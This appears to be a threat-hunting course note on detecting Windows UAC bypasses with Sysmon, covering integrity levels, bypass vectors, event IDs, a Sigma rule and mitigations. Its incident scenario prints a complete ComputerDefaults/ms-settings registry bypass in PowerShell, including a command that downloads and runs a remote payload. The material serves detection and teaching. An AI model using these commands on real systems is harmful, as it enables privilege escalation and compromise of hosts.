---
tags: [threat-hunting, endpoint, windows, sysmon, vapt]
difficulty: intermediate
module: "89 - Endpoint Threat Hunting: Windows, Sysmon, EDR"
topic: "89.11 Hunting for UAC Bypasses"
---

# 89.11 Hunting for UAC Bypasses

## Introduction to User Account Control (UAC)

User Account Control (UAC) is a fundamental security feature in modern Windows operating systems designed to mitigate the impact of malware and accidental system changes. Introduced in Windows Vista, UAC ensures that all applications run with standard user privileges (Medium Integrity Level) by default, even if the logged-on user has administrative rights. When an application requires elevated privileges to perform system-level changes, UAC prompts the user for consent or administrative credentials, depending on the configuration.

In a default Windows environment, users are assigned a split access token upon logon. The first token is a standard user token, stripped of administrative privileges, and is used for daily tasks like web browsing or document editing. The second token, an elevated administrative token, is kept inactive and is only applied when an action explicitly requires high privileges and the user grants consent via the UAC prompt.

### Windows Integrity Mechanism (WIM)
UAC heavily relies on the Windows Integrity Mechanism (WIM). Every process, file, and securable object is assigned an Integrity Level (IL). The core levels include:
- **Untrusted / Low:** Internet Explorer protected mode, AppContainers.
- **Medium:** Standard user processes (default context for applications).
- **High:** Elevated processes (requires UAC consent).
- **System:** Core OS services and kernel mode operations.

By default, a lower integrity process cannot write to, modify, or inject code into a higher integrity process. When an attacker gains an initial foothold on a system via phishing or exploitation, their payload typically executes at a Medium Integrity Level. To gain full control of the endpoint, steal sensitive credentials, or disable security products, the attacker must elevate their process to High Integrity. This transition is where UAC bypass techniques come into play.

## The Mechanics of UAC Bypasses

A UAC bypass allows an attacker who already possesses administrative rights (but is currently running in a Medium IL context) to execute a payload at a High IL without triggering the visible UAC prompt to the user. This is crucial for stealth and persistence.

UAC bypasses generally abuse trusted Windows components that auto-elevate. Microsoft designates certain binaries as "auto-elevating" if they meet specific criteria:
1. They must be signed by Microsoft.
2. They must reside in a trusted directory (e.g., `C:\Windows\System32`).
3. Their manifest must specify `autoElevate=true`.

When an auto-elevating binary executes, it quietly transitions from Medium to High Integrity without a prompt, assuming the user is in the Administrators group and the UAC slider is at its default setting. Attackers exploit how these trusted binaries interact with the system—often by manipulating registry keys, hijacking COM objects, or abusing environment variables—to force the elevated binary to launch a malicious payload.

### Common Bypass Vectors
1. **Registry Key Manipulation (Fileless Bypasses):** Many auto-elevating binaries look for configuration data in the current user's registry hive (`HKCU`). Since standard users have write access to `HKCU`, attackers can plant malicious commands in keys that the trusted binary queries. Examples include `fodhelper.exe`, `eventvwr.exe`, and `slui.exe`.
2. **DLL Hijacking / Sideloading:** Auto-elevating binaries might attempt to load DLLs from predictable paths or missing paths without checking signatures strictly. By placing a malicious DLL in the path, the attacker's code is loaded and executed within the High Integrity context of the trusted process.
3. **COM Object Hijacking:** Attackers can override COM object registrations in `HKCU\Software\Classes\CLSID\` to redirect method calls made by auto-elevating processes to malicious binaries.
4. **Environment Variable Injection:** Modifying environment variables like `windir` or `systemroot` to redirect execution flows of scheduled tasks or elevated processes.

## ASCII Diagram: Fodhelper UAC Bypass Flow

The following diagram illustrates the classic `fodhelper.exe` UAC bypass, which exploits the lack of validation in registry key lookups during execution.

```text
+-----------------------------------------------------------------------------------------+
|                                  Fodhelper UAC Bypass Flow                              |
+-----------------------------------------------------------------------------------------+

  [Attacker Initial Access]
           |
           v
  +-----------------------+      (1) Write malicious payload path to Registry
  |  Malicious Script/    |----------------------------------------------------------+
  |  Command Line (Med IL)|                                                          |
  +-----------------------+                                                          |
           |                                                                         v
           | (2) Launch C:\Windows\System32\fodhelper.exe                 +--------------------------+
           v                                                              | HKCU\Software\Classes\   |
  +-----------------------+                                               | ms-settings\shell\open\  |
  |    fodhelper.exe      |                                               | command\(default)        |
  |    (Auto-Elevating)   |                                               | Value: "cmd.exe /c ..."  |
  +-----------------------+                                               +--------------------------+
           |
           | (3) Fodhelper starts in High IL. It queries HKCU for the "ms-settings" ProgID
           |     to determine how to open the settings interface.
           v
  +-----------------------+
  |   Registry Query      | -----> Reads malicious value from the overridden HKCU key.
  +-----------------------+
           |
           | (4) Fodhelper executes the specified command using ShellExecute.
           v
  +-----------------------+
  |  cmd.exe /c payload   | -----> Payload runs in High IL (System level rights).
  |   (High Integrity)    |
  +-----------------------+
           |
           v
  [Full System Compromise]
```

## Sysmon and EDR Telemetry for UAC Bypasses

Hunting for UAC bypasses requires continuous monitoring of process creation events, registry modifications, and anomalous child-parent process relationships. Sysmon is uniquely positioned to capture these artifacts efficiently.

### 1. Process Creation (Sysmon Event ID 1)
Event ID 1 records the creation of processes. Key fields for hunting UAC bypasses include:
- `IntegrityLevel`: Look for transitions. While standard transitions to `High` are normal for legit admin tasks, malicious bypasses often spawn unusual child processes (like `cmd.exe`, `powershell.exe`, or unknown binaries) running at `High` integrity.
- `ParentImage`: The parent process making the execution. Many UAC bypasses abuse specific native binaries.
- `Image`: The executed binary.

**Hunting Logic:**
- Search for processes where `IntegrityLevel` is `High` or `System`.
- Filter for `ParentImage` being a known auto-elevating binary commonly abused for UAC bypasses, such as:
  - `fodhelper.exe`
  - `eventvwr.exe`
  - `sdclt.exe`
  - `computerdefaults.exe`
  - `slui.exe`
  - `wusa.exe`
  - `colorcpl.exe`
  - `wsreset.exe`
- Investigate the `Image` (child process). If `fodhelper.exe` spawns `cmd.exe`, `powershell.exe`, or `rundll32.exe`, it is highly suspicious.

### 2. Registry Modifications (Sysmon Event IDs 12, 13, 14)
The vast majority of modern, fileless UAC bypasses manipulate the registry to intercept the execution flow of auto-elevating binaries. 

**Hunting Logic:**
- Look for `EventID` 12 (Registry object added or deleted) or 13 (Registry value set).
- Target paths within `HKCU\Software\Classes\` that are associated with high-risk ProgIDs or CLSIDs.
- Key patterns to monitor:
  - `HKCU\Software\Classes\ms-settings\Shell\Open\command\*` (Used by `fodhelper` and `computerdefaults`)
  - `HKCU\Software\Classes\mscfile\shell\open\command\*` (Used by `eventvwr`)
  - `HKCU\Software\Classes\exefile\shell\runas\command\*`
  - `HKCU\Software\Classes\AppX82a6gwre4fdg37wtpt6vflrvvd6tu11i\Shell\open\command\*` (Used by `wsreset`)
  - Any creation or modification in `HKCU\Software\Classes\CLSID\{...}\Instance\InitPropertyBag`
- Investigate the `Details` field to see what commands or paths are being written. Often, attackers will write `cmd.exe /c [malicious payload]`.

### 3. Image Loads (Sysmon Event ID 7)
For DLL hijacking/sideloading UAC bypasses, attackers drop malicious DLLs in locations where an auto-elevating binary attempts to load them.
- Look for known vulnerable binaries loading unsigned DLLs or DLLs from unusual paths (e.g., `C:\Users\*\AppData\Local\Temp`).

## Real-World Attack Scenario

### The Incident
During a threat hunting engagement, the security team observed anomalous activity on an endpoint belonging to a human resources manager. Initial access was traced back to an Office macro that executed a PowerShell downloader, which established a C2 beacon running under the user's Medium Integrity context.

### The Attack Progression
The attacker realized they needed administrative privileges to dump credentials using Mimikatz and disable the local endpoint protection. To achieve this quietly, they executed a PowerShell script implementing the `ComputerDefaults.exe` UAC bypass.

1. **Registry Modification:** The attacker's Medium Integrity beacon executed the following commands:
   ```powershell
   New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
   New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
   Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/payload.ps1')" -Force
   ```
   Sysmon generated **Event ID 13** alerts for these specific registry paths.

2. **Triggering the Bypass:** The attacker then launched the auto-elevating binary:
   ```powershell
   Start-Process "C:\Windows\System32\ComputerDefaults.exe"
   ```
   Sysmon generated **Event ID 1** for `ComputerDefaults.exe` (Parent: `powershell.exe`).

3. **Elevation:** `ComputerDefaults.exe` started in High Integrity. It attempted to open its default interface by looking up `ms-settings` in the registry. It found the attacker's overridden entries in `HKCU` instead of the global `HKLM` entries.
4. **Execution:** `ComputerDefaults.exe` executed the default value of the registry key, spawning `cmd.exe` running the PowerShell stager. 
   Sysmon generated **Event ID 1** showing `cmd.exe` (and subsequently `powershell.exe`) starting with `IntegrityLevel: High` and `ParentImage: C:\Windows\System32\ComputerDefaults.exe`.

### The Hunt and Remediation
The hunting team identified the activity by querying the SIEM for:
`EventID:1 AND IntegrityLevel:High AND ParentImage:"*\\ComputerDefaults.exe"`
This surfaced the anomalous `cmd.exe` execution. Correlating the timeframe with Sysmon Event ID 13 revealed the exact registry keys modified. The team isolated the host, deleted the malicious registry keys, terminated the active C2 connections, and initiated full credential rotation and forensic imaging.

## Advanced Detection and Sigma Rule Concepts

To build robust detections for UAC bypasses, security teams should focus on behavioral patterns rather than specific tool signatures, as tools like UACMe contain dozens of methods that constantly evolve.

### Sigma Rule Example: Fodhelper/ComputerDefaults Bypass
```yaml
title: UAC Bypass via Fodhelper/ComputerDefaults Registry Modification
id: 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
status: experimental
description: Detects registry modifications commonly used for UAC bypass via fodhelper.exe or computerdefaults.exe
logsource:
    product: windows
    category: registry_event
detection:
    selection:
        EventID:
            - 12
            - 13
            - 14
        TargetObject|contains:
            - '\Software\Classes\ms-settings\Shell\Open\command'
            - '\Software\Classes\mscfile\shell\open\command'
    condition: selection
level: high
```

### Analytical Strategies
- **Temporal Correlation:** Look for a high volume of registry modifications in `HKCU\Software\Classes\` followed rapidly (within milliseconds or seconds) by the execution of a native Windows binary, which then spawns a command shell or scripting engine.
- **Null Value Creation:** Many bypasses require setting a `DelegateExecute` value to null or an empty string. Monitoring for the creation of `DelegateExecute` in unusual paths is a high-fidelity indicator.
- **Execution from Temp Paths:** Elevated processes suddenly executing binaries located in `C:\Users\Public` or `AppData\Local\Temp`.

## Mitigation Strategies

While UAC is not considered a true security boundary by Microsoft, hardening it drastically raises the cost and complexity for attackers.
1. **Set UAC to "Always Notify":** This is the strongest setting and mitigates almost all standard auto-elevation UAC bypasses because it forces a prompt for any elevated action, even by Microsoft binaries.
2. **Remove Local Admin Rights:** The most effective defense. If a user is not in the Administrators group, they cannot bypass UAC to gain High Integrity. Employ Privilege Access Management (PAM) or Local Administrator Password Solution (LAPS).
3. **Attack Surface Reduction (ASR) Rules:** Implement ASR rules in Microsoft Defender to block executable files from running unless they meet a prevalence, age, or trusted list criterion, specifically targeting anomalous child processes.
4. **Monitor and Alert:** Aggressively monitor the `HKCU\Software\Classes` registry hive for modifications by non-system processes.

## Chaining Opportunities
- **Initial Access -> Persistence:** Once UAC is bypassed, attackers typically install High Integrity persistence mechanisms, such as Windows Services, Scheduled Tasks running as SYSTEM, or WMI event subscriptions.
- **Credential Access:** High Integrity is a prerequisite for executing tools like Mimikatz or dumping the LSASS process memory. UAC bypass is often the immediate step prior to credential dumping.
- **Defense Evasion:** Elevated privileges allow attackers to kill EDR processes, disable Windows Defender via registry keys, or unload Sysmon drivers.

## Related Notes
- [[12 - Endpoint Detection and Response EDR Telemetry Analysis]]
- [[13 - Hunting for Fileless Malware and In-Memory Execution]]
- [[04 - Living Off The Land Binaries (LOLBins)]]
- [[08 - Credential Dumping Techniques and Detection]]
- [[10 - Persistence Mechanisms in Windows OS]]
